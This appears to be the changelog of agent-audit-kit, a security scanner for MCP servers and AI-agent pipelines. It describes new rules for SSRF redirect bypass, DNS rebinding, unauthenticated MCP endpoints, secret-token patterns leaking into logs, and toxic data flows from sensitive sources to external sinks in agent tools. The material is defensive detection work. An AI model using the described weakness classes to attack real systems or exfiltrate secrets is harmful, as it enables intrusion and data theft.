**Headline: LangChain SSRF redirect (CVE-2026-41481), URL-allow-list TOCTOU /
DNS rebinding (CVE-2026-41488), Azure MCP missing-auth (CVE-2026-32211),
toxic-flow source/sink scanner (Snyk Agent Scan parity, feature-flagged),
pre-commit `rev:` pin sync, GitHub verified-creator application packet.**

Closes the watcher-filed 48h SLA on #61 and #62, ships the broader
validate-then-fetch class as two distinct rules (redirect bypass vs. DNS
rebinding TOCTOU), pulls Snyk's toxic-flow scanner into the AAK rule set
behind a feature flag, and removes the README pre-commit `rev:` drift the
v0.3.4 sync workflow missed.

### Added — rule coverage (4 new rules, 157 → 161)

- **AAK-LANGCHAIN-SSRF-REDIR-001** (HIGH, Category.TRANSPORT_SECURITY) —
  validate-then-fetch SSRF: a function calls a known SSRF guard helper
  (`validate_safe_url`, `is_safe_url`, `validateSafeUrl`, …) and then
  fetches via `requests.get` / `httpx.get` / `urllib.urlopen` / `fetch` /
  `axios.get` / `got` without `allow_redirects=False`,
  `follow_redirects=False`, `redirect: 'manual'`, or `maxRedirects: 0`.
  CVE-2026-41481 (langchain-text-splitters < 1.1.2). New scanner
  `scanners/ssrf_redirect.py` walks Python AST (sorted by source line so
  BFS-walk doesn't reorder fetch-before-guard) and applies a regex pass
  for TS/JS sources. Pin-check across `requirements*.txt`,
  `pyproject.toml`, `poetry.lock`, `Pipfile.lock`, `uv.lock`.
- **AAK-SSRF-TOCTOU-001** (MEDIUM, Category.TRANSPORT_SECURITY) —
  validate-then-fetch DNS-rebind / TOCTOU. Same SSRF guard but the rule
  fires on the second-DNS-resolution shape: guard call followed by a
  fetch with no IP-pinning marker (`socket.getaddrinfo`, `HTTPAdapter`,
  `pinned_ip`, `Host:` header pin) in the same function. CVE-2026-41488
  (langchain-openai < 1.1.14). New scanner `scanners/ssrf_toctou.py`.
- **AAK-AZURE-MCP-001** (HIGH, Category.MCP_CONFIG) — Azure MCP server
  consumed without authentication. Detects `.mcp.json` / `.azure-mcp/`
  configs that point at an Azure MCP endpoint without `Authorization:`,
  mTLS client cert, or Azure-AD / managed-identity token. CVE-2026-32211
  (CVSS 9.1, server-side default ships with no auth). Extends
  `scanners/supply_chain.py`.
- **AAK-TOXICFLOW-001** (HIGH, Category.TOOL_POISONING) — Snyk Agent Scan
  parity. Per-scan tool-graph from MCP servers in `.mcp.json` and
  `@tool`/`@mcp.tool`-decorated Python functions. Emits a finding for
  every (sensitive_source, external_sink) pair listed in
  `agent_audit_kit/data/toxic_flow_pairs.yml` unless allow-listed in
  `.aak-toxic-flow-trust.yml` with a non-empty justification. Behind
  `AAK_TOXIC_FLOW=1` feature flag for v0.3.5; full deny-graph design
  review queues for v0.4.0. New scanner `scanners/toxic_flow.py`, data
  file `agent_audit_kit/data/toxic_flow_pairs.yml`.

### Added — release-mechanics / docs

- `scripts/sync_repo_metadata.py` extended with
  `_PRECOMMIT_BLOCK_RE` — rewrites `rev: vX.Y.Z` lines under
  `repo: https://github.com/sattyamjjain/agent-audit-kit` only (won't
  touch unrelated pre-commit hooks). New regression test
  `test_pre_commit_rev_pin_matches_version` proves the README pre-commit
  example aligns with `pyproject.toml` on every PR.
- `docs/launch/github-verified-creator-application.md` — pre-filled
  application packet for the GitHub Marketplace verified-creator badge,
  citing PyPI OIDC trusted publishing, Sigstore attestations, SLSA
  provenance v1, Immutable-Action manifest, and the 749-test +
  161-rule signed bundle.

### Fixed

- README pre-commit example pinned at `rev: v0.3.0` while v0.3.4 was
  current — surfaced by browsing main on 2026-04-25. The new
  `_PRECOMMIT_BLOCK_RE` pass and its regression test prevent recurrence.

### Issue closures

- Closes #61 (CVE-response: CVE-2026-41481) — covered by
  AAK-LANGCHAIN-SSRF-REDIR-001.
- Closes #62 (CVE-response: CVE-2026-41488) — covered by
  AAK-SSRF-TOCTOU-001.

## [0.3.4] - 2026-04-24

**Headline: DNS-rebinding SDK class (CVE-2025-66414/66416, CVE-2026-35568,
CVE-2026-35577), Splunk MCP token-in-log (CVE-2026-20205), GitHub Actions
Immutable-Action / SHA-pin gate, in-flight CVE pin-checks (CVE-2026-40576,
CVE-2026-40608), OWASP Agentic public JSON artefact, repo-metadata sync.**

Closes the April-2026 DNS-rebinding cluster across the Python, Java, TS and
Apollo MCP SDKs, ships a token-in-log sink detector covering the Splunk
MCP bulletin, wires a SHA-pin regression fence for downstream users on the
GitHub Actions 2026 roadmap, and publishes the OWASP Agentic reference-tool
submission packet with a machine-readable coverage artefact.

### Added — rule coverage (6 new rules, 151 → 157)

- **AAK-DNS-REBIND-001** (CRITICAL, Category.TRANSPORT_SECURITY) — MCP
  `StreamableHTTP*` transport exposed without a Host-header allow-list.
  Covers CVE-2025-66414, CVE-2025-66416 (Python `mcp`), CVE-2026-35568
  (Java `io.modelcontextprotocol.sdk:mcp-core`), CVE-2026-35577
  (`@apollo/mcp-server`). New scanner `scanners/dns_rebind.py` walks
  `.py`/`.ts`/`.js`/`.mjs`/`.cjs` sources for `StreamableHTTPSessionManager`,
  `streamable_http`, `StreamableHTTPTransport` and suppresses only when a
  host allow-list marker (`TrustedHostMiddleware`, `allowed_hosts=`,
  `allowedHosts:`, `validate_host`, `HostHeaderFilter`) is reachable
  anywhere in the project.
- **AAK-DNS-REBIND-002** (HIGH, Category.SUPPLY_CHAIN) — vulnerable MCP SDK
  version pinned in a manifest. Patched floors: Python `mcp` ≥ 1.23.0, TS
  `@modelcontextprotocol/sdk` ≥ 1.21.1, Java `mcp-core` ≥ 0.11.0,
  `@apollo/mcp-server` ≥ 1.7.0. Scans `requirements*.txt`, `pyproject.toml`,
  `package.json` (dependencies / devDependencies / peerDependencies),
  `pom.xml`, `build.gradle`, `build.gradle.kts`.
- **AAK-SPLUNK-TOKLOG-001** (HIGH, Category.SECRET_EXPOSURE) — token-shaped
  values (Bearer, JWT, `splunkd_session`, `st-*`, `sk-ant-*`, `ghp_*`) or
  unredacted token-named variables interpolated into a log sink
  (`logger.info/warn/error`, `print`, `console.log`, `System.out.println`).
  Suppresses on explicit redact markers (`***`, `<redacted>`, `mask(...)`).
  New scanner `scanners/log_token_leak.py`. Pin-check for
  `splunk-mcp-server < 1.0.3` (CVE-2026-20205).
- **AAK-GHA-IMMUTABLE-001** (MEDIUM, Category.SUPPLY_CHAIN) — third-party
  GitHub Action pinned by tag or branch instead of 40-character commit SHA.
  `actions/*` and `github/*` are exempt (Immutable-Actions publishers).
  Local composite actions (`./path/to/action`) are exempt. New scanner
  `scanners/gha_hardening.py` walks `.github/workflows/*.yml` via PyYAML so
  every `uses:` step shape is covered. Aligned to the GitHub Actions 2026
  Security Roadmap.
- **AAK-EXCEL-MCP-001** (CRITICAL, Category.SUPPLY_CHAIN) — CVE-2026-40576,
  `excel-mcp-server <= 0.1.7` path-traversal in `get_excel_path()` combined
  with the default 0.0.0.0 bind on SSE / Streamable-HTTP. Pin-check in
  `scanners/supply_chain.py`. Patched in 0.1.8.
- **AAK-NEXT-AI-DRAW-001** (MEDIUM, Category.TRANSPORT_SECURITY) —
  CVE-2026-40608, `next-ai-draw-io < 0.4.15` body-accumulation OOM in the
  embedded HTTP sidecar. Pin-check in `scanners/transport_limits.py` next
  to AAK-MCPFRAME-001 (same class).

### Added — coverage artefacts

- `public/owasp-agentic-coverage.json` — machine-readable OWASP Agentic
  Top 10 2026 coverage schema (v1) with ASI slot density, CVE references,
  AICM references per rule. Regenerated on every release by
  `scripts/gen_owasp_coverage.py`. `tests/test_owasp_public_json.py`
  enforces the schema and ≥3 rule density floor.
- `docs/launch/owasp-reference-tool-submission.md` — pre-filled submission
  packet for the OWASP Agentic reference-tool registry. Closes #24 + #25.

### Added — release-mechanics / tooling

- `scripts/sync_repo_metadata.py` — single source of truth for
  `sattyamjjain/agent-audit-kit@vX.Y.Z` pins across `README.md`,
  `docs/**/*.md` (excluding frozen `release-notes-v*.md` history), and the
  canonical GitHub repo description string. `--check` exits non-zero on
  drift, `--write` rewrites, `--description` prints the string.
- `.github/workflows/sync-repo-metadata.yml` — triggers on
  `release.published` + `workflow_dispatch`; rewrites pins and edits the
  repo description via `gh repo edit`. Uses SHA-pinned actions only.
- `tests/test_repo_metadata_sync.py` — regression fence: every README pin
  must match the live `pyproject.toml` version.

### Fixed

- Closed the cross-category drift where the README badge showed
  "rules-151" while the OpenGraph / repo-description field was stuck at
  "77 rules". The new sync workflow plus regression test remove the class.
- README example snippets now bump in lock-step with the release tag
  instead of requiring a manual edit.

### Deferred to v0.3.5

- CSA MCP Security Baseline v1.0 mapping — not yet public as of 2026-04-24.
  Watcher (`scripts/watch_csa_mcp_baseline.py`) remains armed.
- CVE-2026-31504 (Linux kernel fanout UAF) — out-of-scope for an MCP /
  agent-pipeline scanner. Closed on the CVE-response queue with rationale.

## [0.3.3] - 2026-04-21

**Headline: mcp-framework + Apache Doris pin-checks, Anthropic MCP SDK
STDIO hardening, CVE-watcher dedup, AICM density to ≥51%, CycloneDX
AI-BOM emitter.**

Clears the 48h SLA on CVE-2026-39313 and CVE-2025-66335, adds the
SDK-level inheritance check the OX Security 2026-04-15 disclosure asked
for, roots out the watcher regression that opened five copies of
CVE-2026-6599, and lifts the AICM mapping density from a 7% starter to
a real procurement-facing 63%.

### Added — rule coverage (3 new rules, 148 → 151)

- **AAK-MCPFRAME-001** (MEDIUM) — CVE-2026-39313, mcp-framework < 0.2.22
  HTTP-body DoS. Detection: `package.json` pin-check + TS/JS regex for
  `readRequestBody`-style chunk-concat accumulating into a string
  without a `Content-Length` / `maxMessageSize` guard. Ships in a new
  `scanners/transport_limits.py`. Strips `//` and `/* ... */` comments
  before matching the size-guard regex so docstring mentions do not
  spuriously suppress.
- **AAK-DORIS-001** (HIGH) — CVE-2025-66335, apache-doris-mcp-server
  < 0.6.1 SQL injection via query-context neutralization bypass.
  Pin-check scans `requirements*.txt`, `pyproject.toml`,
  `Pipfile(.lock)`, `poetry.lock`, `uv.lock`. Lives in
  `scanners/supply_chain.py`.
- **AAK-ANTHROPIC-SDK-001** (HIGH) — SDK-level STDIO sanitization
  inheritance check covering the OX Security 2026-04-15 class.
  Anthropic declined to CVE — "sanitization is the developer's
  responsibility". Fires only when (a) an upstream MCP SDK is declared
  in a manifest (Python `mcp`/`modelcontextprotocol`, TS
  `@modelcontextprotocol/sdk`, Java `io.modelcontextprotocol:*`, Rust
  equivalents), (b) a STDIO transport is exposed, and (c) no
  sanitizer, HTTP opt-out, or documented risk acceptance is present.
  Opt-out via `.agent-audit-kit.yml` with `accepts_stdio_risk: true`
  plus a non-empty `justification:`. Ships in a new
  `scanners/mcp_sdk_hardening.py`. Tagged
  `incident_references=["OX-MCP-2026-04-15"]`.

### Added — OWASP Agentic 2026 density floor

- `tests/test_owasp_agentic_coverage.py` now enforces a **≥3 rules per
  ASI slot** density floor (parametrized). The marketing claim
  "OWASP Agentic Top 10: 10/10" is now backed by a test that fails
  CI if any slot falls below three rules.
- `AAK-A2A-003`, `AAK-A2A-011`, `AAK-A2A-012` gain `ASI08` tags
  (Agent Communication Poisoning) — lifts ASI08 coverage from 1 rule
  to 3.
- `scripts/gen_owasp_coverage.py` additionally rewrites a
  `<!-- owasp-coverage:start -->`…`<!-- owasp-coverage:end -->`
  marker in `README.md` so the rendered coverage table stays in lockstep
  with the code.

### Added — CSA AICM density to ≥51%

- `_AICM_TAGS` in `agent_audit_kit/rules/builtin.py` expands from 10
  rules (7%) to **95 rules (63%)**, covering the SECRET-*, SUPPLY-*,
  TRUST-*, TRANSPORT-*, A2A-*, POISON-*, TAINT-*, SSRF-*, OAUTH-*,
  SKILL-*, MARKETPLACE-*, HOOK-*, and CVE-response families. Each
  family maps to the canonical AICM control domain (DSP / IAM / STA /
  CEK / AIS / LOG / IVS / CCC).
- `tests/test_aicm.py` gets a **density floor assertion** — the suite
  now fails CI if fewer than 75 rules carry an AICM tag.
- `--compliance aicm` CSV output reflects the expanded mapping
  automatically; no CLI change needed.

### Added — CycloneDX AI-BOM emitter

- `agent-audit-kit sbom --format aibom` emits a CycloneDX 1.5 AI/ML-BOM
  on top of the existing SBOM primitive. Adds:
  - `components` entries with `type: "machine-learning-model"` for each
    detected vendor SDK (anthropic/Claude, openai/GPT, cohere/Command).
  - A `formulation` block listing detected agent-platform SDKs
    (LangChain, LangSmith, LangGraph, LangFuse, Helicone, Humanloop,
    MCP SDK) with pURLs where the pin can be extracted.
  - `metadata.properties`: `aak:rule-bundle-sha256` (pulled from
    `rules.json.sha256` if present), `aak:aibom: "1"` marker, and one
    `aak:incident-fired` per fired incident reference so the BOM can
    double as attestation evidence.
- Covered by `tests/test_cyclonedx_aibom.py`.

### Fixed — CVE-response watcher dedup (Task A)

- `scripts/cve_watcher.py` was only deduping against
  `CHANGELOG.cves.md`. A CVE sitting in the SLA queue without a rule
  yet never reached the changelog, so the 6-hourly cron re-opened it.
  Over 48h this filed five copies of CVE-2026-6599 (#47/#48/#50/#52/#55)
  and three of CVE-2025-66335.
- Rewritten with three layers of dedup (any one suppresses):
  1. `CHANGELOG.cves.md`.
  2. Persistent `.aak/cve-watcher-state.json` (cached across workflow
     runs via `actions/cache`).
  3. Open `cve-response` issue titles + bodies via the GitHub REST API.
- New `scripts/close_duplicate_cve_issues.py` groups existing open
  `cve-response` issues by extracted CVE ID, keeps the lowest-numbered,
  closes the rest with a cross-reference body. Ran against live repo
  during this release: closed #48, #50, #51, #52, #54, #55, #56 (7
  dups).
- `.github/workflows/cve-watcher.yml` now wires `GITHUB_TOKEN` +
  `GITHUB_REPOSITORY` into the diff step and restores the state file
  from `actions/cache`.
- Covered by `tests/test_cve_watcher_dedup.py` — five scenarios
  including the observed "same CVE × 3 cron runs" replay.

### Added — provenance plumbing

- `CHANGELOG.cves.md` gains entries for CVE-2026-39313,
  CVE-2025-66335, and the OX-MCP-2026-04-15 incident class.
- `watch.py` parameter annotations updated from the string-form
  `"callable | None"` to the proper `Callable[[int, list[Any]], None]`
  (incidental mypy-1.x compatibility fix carried over from 0.3.2.1
  hotfix).
- `scanners/marketplace_manifest.py` ships the Python 3.10 `tomli`
  fallback that made CI green for 0.3.2 — kept for 0.3.3.

### Thanks

OX Security for the 2026-04-15 "Mother of all AI supply chains"
disclosure; Apache Doris for the 0.6.1 patch turnaround; the CSA AICM
working group for publishing a v1 control catalog we can map to.

## [0.3.2] - 2026-04-20

**Headline: MCPwn coverage + third-party OAuth-app surface + OWASP Agentic 2026 coverage proof.**

Closes the KEV-listed CVE-2026-33032 (MCPwn) with a targeted middleware-
asymmetry detector, ships first-class coverage for the April 19 2026
Vercel × Context.ai OAuth breach class, and gates every future PR on
OWASP Agentic Top 10 2026 coverage.

### Added — rule coverage (6 new rules)

- **AAK-MCPWN-001** (CRITICAL) — twin-route middleware-asymmetry
  detector across Go/Gin, Python/FastAPI, and Node/Express. This is
  CVE-2026-33032 itself, not a generic MCP-config check: if `/mcp`
  has AuthRequired() and `/mcp_message` doesn't, the rule fires. Also
  recognises the `router.Group("/", AuthRequired())` patched pattern
  so 2.3.4+ doesn't produce false positives. Maps CVE-2026-33032
  and CVE-2026-27944.
- **AAK-FLOWISE-001** (CRITICAL) — CVE-2026-40933 (GHSA-c9gw-hvqq-f33r,
  CVSS 10.0). Pin-check on `flowise` / `flowise-components` < 3.1.0,
  plus a flow-config pass that flags MCP adapter nodes with
  `customFunction` / `runCode` / `executeCommand` sinks. Auto-fixable
  via `agent-audit-kit fix --cve`.
- **AAK-OAUTH-SCOPE-001** (HIGH) — third-party OAuth client granted
  broad Google Workspace scopes (admin.*, cloud-platform, drive,
  directory.*, gmail.modify/send). Repos add trusted client IDs to
  `.aak-oauth-trust.yml`.
- **AAK-OAUTH-3P-001** (MEDIUM) — repo depends on an agent-platform
  SDK (context-ai, langsmith, helicone, langfuse, humanloop, MCP SDK).
  Informational finding so reviewers audit OAuth-scope footprints
  before merge.
- Together AAK-OAUTH-* tag `incident_references=["VERCEL-2026-04-19"]`,
  the first use of the new incident-provenance field.

### Added — schema + tooling

- **`SCHEMA_VERSION = 2`** bump in `agent_audit_kit/models.py`:
  - New `incident_references: list[str]` field (Task G).
    Backfilled:
    - `AAK-STDIO-001` → `OX-MCP-2026-04-15` (retrofit).
    - `AAK-OAUTH-SCOPE-001` / `AAK-OAUTH-3P-001` → `VERCEL-2026-04-19`.
    - `AAK-MCPWN-001` → `MCPWN-2026-04-16`.
  - New `aicm_references: list[str]` field (Task E) — CSA AI Controls
    Matrix control IDs. Seeded 10 mappings (DSP-17, IAM-01/02/16,
    STA-02/08, CEK-08, LOG-06).
- **`--compliance aicm`** — new scan flag that emits a CSV sorted by
  AICM control ID. `output/aicm.py` is the formatter.
- **OWASP Agentic 2026 coverage gate** — `tests/test_owasp_agentic_coverage.py`
  fails CI if any of ASI01…ASI10 has zero backing rules. Paired with
  `scripts/gen_owasp_coverage.py` that regenerates
  `docs/owasp-agentic-coverage.md` on demand.
- **SARIF `fingerprint-strategy`** — `auto` (default) / `line-hash` /
  `disabled`. `action.yml` exposes the input; `entrypoint.sh` threads
  it. Fixes the GH Code Scanning de-dup regression that marketplace
  runners (detached source) hit without self-emitted fingerprints.
- **CSA MCP Security Baseline watcher** — `scripts/watch_csa_mcp_baseline.py`
  polls the CSA Resource Center + modelcontextprotocol-security.io
  weekly, files a tracking issue on drop, and persists seen versions
  in `.aak/csa-mcp-baseline-state.json` so each version triggers once.
- **`docs/rule-schema.md`** — documents v1 + v2 field set and the
  SARIF tag projection.

### Changed

- Rule count 144 → **148** (6 new rules, 2 of which technically land
  as pairs under the OAuth umbrella).
- `rules.json` regenerated (SHA-256 `5c7b1c47cd067e86a533d6084925472a356442afbefcd8af6f3a0b3c3afd393b`).
- `CHANGELOG.cves.md` now lists the MCPwn + Flowise entries and
  demotes the pre-v0.3.2 "covered by AAK-MCP-011/012/020" claim for
  CVE-2026-33032 to secondary coverage (primary is now AAK-MCPWN-001).

### Verified sources

- [NVD CVE-2026-33032](https://nvd.nist.gov/vuln/detail/CVE-2026-33032) — MCPwn, CVSS 9.8, KEV 2026-04-13.
- [Rapid7 ETR](https://www.rapid7.com/blog/post/etr-cve-2026-33032-nginx-ui-missing-mcp-authentication/).
- [Picus MCPwn writeup](https://www.picussecurity.com/resource/blog/cve-2026-33032-mcpwn-how-a-missing-middleware-call-in-nginx-ui-hands-attackers-full-web-server-takeover).
- [GHSA-c9gw-hvqq-f33r](https://github.com/advisories/GHSA-c9gw-hvqq-f33r) — Flowise, CVSS 10.0, fixed 3.1.0.
- [Vercel April 2026 bulletin](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident).
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/).
- [GitHub Docs — SARIF support for Code Scanning](https://docs.github.com/en/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning).
- [CSA AI Controls Matrix v1.0](https://cloudsecurityalliance.org/artifacts/ai-controls-matrix).
- [CSA MCP Security Resource Center](https://cloudsecurityalliance.org/blog/2025/08/20/securing-the-agentic-ai-control-plane-announcing-the-mcp-security-resource-center).

## [0.3.1] - 2026-04-19

**Headline: Ox MCP supply-chain coverage + rule-count single source of truth + SARIF fingerprints.**

Ships rule coverage for every disclosed MCP CVE from the last 48 hours, honoring
the public [AAK Response SLA](CHANGELOG.cves.md).

### Added — rule coverage (6 new rules)

- **AAK-STDIO-001** (CRITICAL) — Ox Security's Apr-16 disclosure covered
  10 CVEs rooted in the same shape: user-controllable input reaching
  STDIO command executors in MCP servers. One AST-based Python scanner
  plus a TS regex pass closes the whole family in one rule. Maps
  CVE-2026-30615, CVE-2025-65720, CVE-2026-30617, CVE-2026-30618,
  CVE-2026-30623, CVE-2026-30624, CVE-2026-30625, CVE-2026-33224,
  CVE-2026-26015.
- **AAK-WINDSURF-001** (HIGH) — zero-click `.windsurf/mcp.json`
  auto-registration (CVE-2026-30615): flags `auto_approve:true` /
  `auto_execute:true`, world-writable parent dirs, and unpinned server
  commands.
- **AAK-NEO4J-001** (MEDIUM) — `mcp-neo4j-cypher < 0.6.0` read-only
  bypass via APOC (CVE-2026-35402). Version-pin check + source pattern
  detection (`read_only=True` + APOC call in the same file).
  `auto_fixable=True` — `agent-audit-kit fix --cve` bumps the pin.
- **AAK-CLAUDE-WIN-001** (HIGH) — Claude Code Windows ProgramData
  hijack (CVE-2026-35603). Requires sibling `setup.ps1` with `icacls`
  ACL hardening when a `managed-settings.json` lives in a ProgramData
  path.
- **AAK-LOGINJ-001** (MEDIUM) — log injection via CRLF/ANSI in tool
  params (CVE-2026-6494, CWE-117). AST pass: `@tool` parameters flowing
  into `logger.*` / `print` / `sys.stdout` / `console.log` without
  sanitization.
- **AAK-SEC-MD-001** (LOW) — MCP-server repos without SECURITY.md /
  `security_contact`. Anthropic Apr-2026 baseline expectation.

### Added — trust / DevEx

- **Rule-count single source of truth**: `scripts/sync_rule_count.py`
  rewrites the `rules-<N>-blue` badge, the `action.yml` description,
  and `agent_audit_kit.__init__.RULE_COUNT` from `rules.json`. Wired
  into `.github/workflows/sync-rule-count.yml` (auto-commits drift) and
  `.pre-commit-config.yaml` (blocks human drift locally). Regression
  fence in `tests/test_rule_count_sync.py`.
- **SARIF upgrades** (`output/sarif.py`):
  - `partialFingerprints.primaryLocationLineHash` is now SHA-256 of
    **line content + rule ID**, so GH Code Scanning de-dupes across
    pushes even when line numbers shift, and flags as new when the
    content changes. Falls back to a location-based hash when the
    file can't be read.
  - `helpUri` → `https://agent-audit-kit.dev/rules/{rule_id}` per rule.
  - `results[].properties.security-severity` included on every result
    (was only on the rule descriptor).
- **PR comment + `$GITHUB_STEP_SUMMARY`** (`output/pr_summary.py`):
  scan results render as a Markdown table (Rule | Severity | Location |
  Suggestion) written to `$GITHUB_STEP_SUMMARY` every run, and posted
  as a sticky PR comment (marker-based) when `comment-on-pr=true`.
  New `action.yml` input: `comment-on-pr` (default `true`).
  New CLI flags: `--step-summary` / `--no-step-summary` and
  `--pr-summary-out PATH`.

### Changed

- Rule count 138 → **144**.
- `description:` in `action.yml` now includes the current rule count
  ("144 rules, OWASP Agentic Top 10 + MCP Top 10").
- `rules.json` regenerated and re-signed with the new rule set.

### Fixed

- `README.md` comparison table row claiming "138 rules" for A2A
  scanning (it's always been 12 rules); regression guarded by the
  rule-count sync test.

### Supply chain

Every release artifact continues to ship alongside a Sigstore-signed
`rules.json`, CycloneDX and SPDX SBOMs, and SLSA build provenance on
the Docker image.

## [0.3.0] - 2026-04-18

Retroactive SLA coverage for the 2026 MCP CVE wave. See [v0.3.0 release
notes](docs/launch/release-notes-v0.3.0.md) for the full scope — 46 new
rules across the 10 ROADMAP §2.2 families (AAK-MCP-011..020, SSRF,
OAUTH, HOOK-RCE, LANGCHAIN, MARKETPLACE, ROUTINE, A2A-008..012,
TASKS, SKILL). Rule count 77 → 138.

## [0.2.0] - 2026-04-05

Initial public release.

### Added

- **74 security rules** across 11 scanner categories: MCP configuration, hook injection, trust boundaries, secret exposure, supply chain, agent config, tool poisoning, taint analysis, transport security, A2A protocol, and legal compliance.
- **11 scanners** with full coverage of MCP-connected AI agent pipelines.
- **9 CLI commands**: `scan`, `discover`, `pin`, `verify`, `fix`, `score`, `update`, and CI-mode shortcuts.
- **SARIF 2.1.0** output with GitHub Security tab integration and inline PR annotations.
- **GitHub Action** (`sattyamjjain/agent-audit-kit@v1`) for zero-install CI scanning.
- **Pre-commit hook** for local scanning before every commit.
- **OWASP coverage**: full mapping to OWASP Agentic Top 10 (10/10), OWASP MCP Top 10, and Adversa AI Top 25.
- **Compliance mapping** for EU AI Act, SOC2, ISO 27001, HIPAA, and NIST AI RMF via `--compliance` flag.
- **Tool pinning** (`pin` and `verify` commands) to detect rug-pull and supply chain drift.
- **Taint analysis** tracking `@tool` parameter flows to shell, eval, SQL, SSRF, file, and deserialization sinks.
- **Security scoring** with letter grades and embeddable badges via `score` command.
- **Auto-fix** with `fix --dry-run` for safe remediation of common findings.
- **Agent discovery** supporting Claude Code, Cursor, VS Code Copilot, Windsurf, Amazon Q, Gemini CLI, Goose, Continue, Roo Code, and Kiro.

[0.2.0]: https://github.com/sattyamjjain/agent-audit-kit/releases/tag/v0.2.0
